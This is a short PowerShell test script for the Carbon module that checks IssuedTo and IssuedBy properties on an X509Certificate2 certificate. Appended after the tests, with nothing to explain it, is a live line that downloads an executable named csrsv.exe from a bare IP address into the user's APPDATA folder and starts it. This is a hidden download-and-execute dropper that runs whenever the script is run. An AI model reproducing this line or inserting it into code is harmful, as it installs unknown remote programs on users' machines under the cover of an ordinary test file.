











function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Test-ShouldCreateIssuedPropertiesOnX509Certificate2
{
    $cert = Get-Certificate -Path (Join-Path $TEstDir CarbonTestCertificate.cer -Resolve)
    Assert-NotNull $cert.IssuedTo ('IssuedTo on {0}' -f $cert.Subject)
    Assert-NotNull $cert.IssuedBy ('IssuedBy on {0}' -f $cert.Subject)
    
    Assert-Equal ($cert.GetNameInfo( 'SimpleName', $true )) $cert.IssuedBy
    Assert-Equal ($cert.GetNameInfo( 'SimpleName', $false )) $cert.IssuedTo
}


(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

